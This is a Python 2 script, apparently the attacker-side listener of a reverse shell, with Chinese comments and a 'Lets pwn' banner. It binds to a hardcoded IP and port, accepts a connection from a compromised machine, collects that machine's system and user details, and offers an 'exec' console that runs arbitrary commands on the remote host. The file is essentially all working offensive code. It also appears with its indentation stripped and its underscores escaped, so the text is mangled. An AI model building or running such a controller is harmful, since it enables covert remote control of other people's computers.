
```python
# -\*- coding: utf-8 -\*-
import socket,subprocess as sp
import sys
import os
import platform
# 颜色美化函数
def script\_colors(color\_type,text):
color\_end = '\033[0m'
if color\_type.lower() == "r" or color\_type.lower() == "red":
red = '\033[91m'
text = red + text + color\_end
elif color\_type.lower() == "lgray":
gray = '\033[2m'
text = gray + text + color\_end
elif color\_type.lower() == "gray":
gray = '\033[90m'
text = gray + text + color\_end
elif color\_type.lower() == "strike":
strike = '\033[9m'
text = strike + text + color\_end
elif color\_type.lower() == "underline":
underline = '\033[4m'
text = underline + text + color\_end
elif color\_type.lower() == "b" or color\_type.lower() == "blue":
blue = '\033[94m'
text = blue + text + color\_end
elif color\_type.lower() == "g" or color\_type.lower() == "gree":
gree = '\033[92m'
text = gree + text + color\_end
elif color\_type.lower() == "y" or color\_type.lower() == "yellow":
yellow = '\033[93m'
text = yellow + text + color\_end
else:
return text
return text
# 横幅函数
def banner():
banner = '''
sszhhzDDhzszhzzhhzssss====ss=+===+====ss=szzzzzzzDDDDhDhzzsD
s+zhhzhhzzsshhzhzhhsss====ss==sss====szszzhhhzzzzhzDDDDDzssD
=+zzhhhhzzhzhhhhzzzssssszsszz=szss====ssszhhhhhhzszDhDDhz==h
=+zzhhhzzhhhzzhhzssss+szsssss=sss=s+=s=sszzzhhhDhzhhhhhhs+=h
z+shzzzzzhzhhhzhsssss+=sszs=s=sssss=====szszhhzzhhsshhhhs(=h
s<=hhzzzhsszhhzsshhzs=+szzsss===ssss==+=szzszzzzzzhzhDhh=<hh
=<=hhzzzzszzss=szhhszs=+shssss==ssss=+<szzzszzhzszzzhDDh+=hh
+=shDshzzssz=sszzs=szz=+=zs=+s==s======zzzzzhzzhzsszshBh=<sh
<==szsszzsssszsss+++zz=++sz==s=====+=+=zssshzzzzszszszDh=<+h
(((<=s=sssssssss=+===s=<+=ssssss=s==++=ss+==ss=sszsss=+++<<z
((<+=sssssss=++=+<+++s+<====ssszs=s=+<=s==+++=sszz====<((((+
<<<+++=s=s===+++++++ss+++====sss====++zs=<++++=sss====+((<((
+((<<=s=+==s=s=+=(<=sh++==s==ss=====++sz=++==+<=ss=+<<<((((<
<((<+++=====++++++++szs=+=s=s=s=====+=zs++++=+<<=====<<((((<
(<+<<+=+=s=+<=szszs=sss=======s======sz=+=+=s+<<<==+++<((~~(
<++<<+++=ssszDDhDBBDzsssss====+=+==ssss=zDDDDhs<<==+<<((((~(
++<<<<<+=szshhsshz=hDs==ss==+=<<+=ss=+=hBDsshBD=<+++<(~((<((
=<++<+++=zs+hs+zDs--hh=+===+=+<<+=s=++hDh<.-=sh=+++<<(((~(<(
+<=+=====+<<z=<hDhz=sDs<<+=++<(<++=<(zszh=~s+<s+<===<<((((((
++=+++<<(<(<z=<hBBNh=hD+<+=<<<(<<+<(+z+sDDDD<<z=~(+=+<(<(~((
+===+<<<<<<<ss<=hBD++hB<(<<<<<((<<~-sh<=BNNz<<z+~(<<<((<((((
==ss=++=+<<<=z+(+=+<=BB<(<<<<<(<(<~-zB<(=Dh+(sz(~~<<<((+<(((
==ss=====+++<=z=+<+sDBB<~<<(<<((((-~zNz((+<(=h+~((<<<<(<<(<<
==========+<+<+szhhDDDD<-(<((((~~~~~zDDh=+=zh=((<+++<<(<<<<<
===s========+<<<++++<+D+~(<(((((~~~(s+=shzzs<(+=++++<((<(<<<
=====s=======++((~~~-+h=(<<<+<((((-(s<--(<<((<====+<<((<<<(+
==+===ss======+=<~((<+==((<<(~~(((-<=+~--~(<+++++=+<<(((<+<+
s=====ssss=+++==++++=<++(<+~~---((~++(((((<++++<+++<<((((<<=
ss===sss=s==s=+=+++++<<+(<(~~~~-~(~<<~(<<<<=<<=+++<<<<((<<<=
sss==sszssss=s=+++++<((<=<(~~~~--~<=<~~(<<<+<<+++<<+<<<(+<<s
sssssszzszss=====+++<((=s<(~~~~~~~+=(~(~(+<<++++++==++<<=<=s
ssssszhhzzzssss==++<<((+s+<(~~~~~(=+--~~~<<<++++===s++<+++zs
zssssszzzzzhzsss=++<<~(<+=<<((~(((=(-'~(((<+++=szs=s=++++=zz
hsszzssszzzhzss=s++<((((+===<((<+<+~'--~(<<<=sszsss====+=szz
hzsszzzsszzzhsszz=<<<<<<=szz=+==ss=<-~~(~(+=+=sss==s===+szzz
hhzsszzzzzzzzzzhzss=<+++shDhhzzhhhh(~(((<+=+=ssssszss===szzs
zhzssszzzzzzzhz=+=s+==+<<zDDDDhDDz<'~(<<+<((=ssszzzs===zzzss
hhhhzzzzzzzzzhz=ss=s++<<(<zBDDDDh<'~~(~(<<++====+===++szzsss
hhhhzzzzzzzzzzzssszzss==+<+hDDDD+~~(<+<+=+++szzzzzs==szzssss
zhhhhhhzzzzzzzzzss=======+++hBB=(<<<(<<++==szssszs=+=zhzzsss
zhhhDhhzzzsszzzhzsszzss+===+sDh+==+<<++===ssssssss=szhhzzzz
hhhhhhhhzzzzhhhhhzsssss=ssssshzs=++=+=+==sssssss=sszhzzzzzzs
zzhhhhhhDDhhhhhhhzzzssssszsszhhz=======ssssszsss=shhhzzzsszs
zzzhzhhDDDDDhhhhhhhzzzzhhhzhhhhhzzzhzssszzzzzzszhzhhzzzzzzzs
zzzzhhhhDhDDDhhhDhhhhzzhhhhzzhzzhhhhzszzhzzszhhhhhhzzzzsszzs
zzzhhhhhDDDDDDDDDDDhhhzs=zzzzzzzss=szzhhhhhhhDDhhzzzzzzzzsss
zzzhhhhhDhhhDDDDDDDDDDhzzs=szss==szzhhDDDDDDDDhhhhzzzzzzzzsz
zzhhhhhhhhhhDDDDDDDDDDDDDzs=ss==szDDDDDDDDDDDhhDDhhzzzzzzzsz
zzhhzhhhhhhDDDDDDDDDDDDDDDhhhhzhDDDhDDDDDDhhhhhhhhhzzzzzzzsz
zzzzzhhhhhhhDDDDDDDDDDDDDDDDDDDDDDhDDDhhhhhhhzhzzzhzzzzzzzzs
--=[ Version 1.0 Alpha Scarlet ]=--
--=[ I am ready ... Lets pwn ]=--
'''
return script\_colors('gray',banner)
# 控制台函数
def console(connection, address):
print script\_colors("g", " [ Info ] ") + script\_colors("b", "Connection Established from %s\n" % (address))
sysinfo = connection.recv(2048).split(",")
x\_info = ''
x\_info += script\_colors("g","Operating System: ") +"%s\n" % (script\_colors("b",sysinfo[0]))
x\_info += script\_colors("g","Computer Name: ") +"%s\n" % (script\_colors("b",sysinfo[1]))
x\_info += script\_colors("g","Username: ") + "%s\n" % (script\_colors("b",sysinfo[5]))
x\_info += script\_colors("g","Release Version: ") + "%s\n" % (script\_colors("b",sysinfo[2]))
x\_info += script\_colors("g","System Version: ") + "%s\n" % (script\_colors("b",sysinfo[3]))
x\_info += script\_colors("g","Machine Architecture: ") + "%s" % (script\_colors("b",sysinfo[4]))
if sysinfo[0] == "Linux":
user = sysinfo[6] + "@" + address
elif sysinfo[0] == "Windows":
user = sysinfo[7] + "@" + address
else:
user = "Unknown@" + address
while 1:
command = raw\_input(" " + script\_colors("underline",
script\_colors("lgray","%s" % (user))) + " " + script\_colors('lgray',">") + " ").strip()
if command.split(" ")[0] == "exec":
if len(command.split(" ")) == 1:
print script\_colors("r", "\n [!] ") + script\_colors("b", "Command: exec <command>")
print script\_colors("g", "\n Execute Argument As Command On Remote Host\n")
continue
res = 1
msg = " "
while len(command.split(" ")) > res:
msg += command.split(" ")[res] + " "
res += 1
response = send\_data(connection,"exec " + msg)
if response.split("\n")[-1].strip() != "":
response += "\n"
if response.split("\n")[0].strip()!="":
response = "\n" + response
for x in response.split("\n"):
print " " + x
elif command == "":
continue
elif command == "cls":
if sysinfo[0] == "Linux":
dp = os.system("clear")
elif sysinfo[0] == "Windows":
dp = os.system("cls")
elif command == "help":
print script\_colors("lgray",help())
elif command == "sysinfo":
if sysinfo[0] == "Linux":
print script\_colors("g", "Operating System: ") + "%s" % (script\_colors("b", sysinfo[0]))
print script\_colors("g", "Computer Name: ") + "%s" % (script\_colors("b", sysinfo[1]))
print script\_colors("g", "Username: ") + "%s" % (script\_colors("b", sysinfo[6]))
print script\_colors("g", "Release Version: ") + "%s" % (script\_colors("b", sysinfo[2]))
print script\_colors("g", "System Version: ") + "%s" % (script\_colors("b", sysinfo[3]))
print script\_colors("g", "Machine Architecture: ") + "%s" % (script\_colors("b", sysinfo[4]))
elif sysinfo[0] == "Windows":
print script\_colors("g", "Operating System: ") + "%s" % (script\_colors("b", sysinfo[0]))
print script\_colors("g", "Computer Name: ") + "%s" % (script\_colors("b", sysinfo[1]))
print script\_colors("g", "Username: ") + "%s" % (script\_colors("b", sysinfo[7]))
print script\_colors("g", "Release Version: ") + "%s" % (script\_colors("b", sysinfo[2]))
print script\_colors("g", "System Version: ") + "%s" % (script\_colors("b", sysinfo[3]))
print script\_colors("g", "Machine Architecture: ") + "%s" % (script\_colors("b", sysinfo[4]))
elif command == "exit()":
connection.send("exit()")
print script\_colors("b"," [+] ") + script\_colors("g","Shell Going Down")
break
else:
print script\_colors("red","[!] Unknown Command")
# 帮助函数
def help():
help\_list = {}
help\_list["sysinfo"] = "Display Remote System Information"
help\_list["exec"] = "Execute Argument Ad Command On Remete Host"
help\_list["cls"] = "Clears The Terminal"
help\_list["help"] = "Prints this help message"
return\_str = script\_colors("g", "\n Command ") + " . "
return\_str += script\_colors("b", " Description\n %s\n" % (script\_colors("gray", "-" \* 50)))
for x in sorted(help\_list):
dec = help\_list[x]
return\_str += " " + script\_colors("g", x) + " - " + script\_colors("b", dec + "\n")
return return\_str.rstrip("\n")
# 发送数据
def send\_data(connection,data):
try:
connection.send(data)
except socket.error as e:
print script\_colors("red","[ - ]") + "Unable To Send Data"
return
result = connection.recv(2048)
total\_size = long(result[:16])
result = result[16:]
while total\_size > len(result):
data = connection.recv(2048)
result += data
return result.rstrip("\n")
# 主控制函数
def main\_control():
try:
#host = sys.argv[1] # 攻击者主机地址
#port = int(sys.argv[2]) # 攻击者主机端口
host = "192.168.14.45"
port = 3800
except Exception as e:
print script\_colors("red","[-]") + "Socket Information Not Provided"
sys.exit(1)
print script\_colors("g"," [+]") + script\_colors("b"," Framework Standard Successfully")
print banner()
s = socket.socket(socket.AF\_INET,socket.SOCK\_STREAM) # 安装套接字
s.bind((host,port))
s.listen(5)
if host == "":
host = "localhost"
print script\_colors("g", " [info] ") + script\_colors("b", "Listening on %s%d ..." % (host, port))
try:
conn,addr = s.accept()
except KeyboardInterrupt:
print "\n\n " + script\_colors("red", "[-]") + script\_colors("b", " User Request An Interrupt")
sys.exit(0)
console(conn,str(addr[0]))
s.close() # 关闭套接字
if \_\_name\_\_ == "\_\_main\_\_":
main\_control()
```
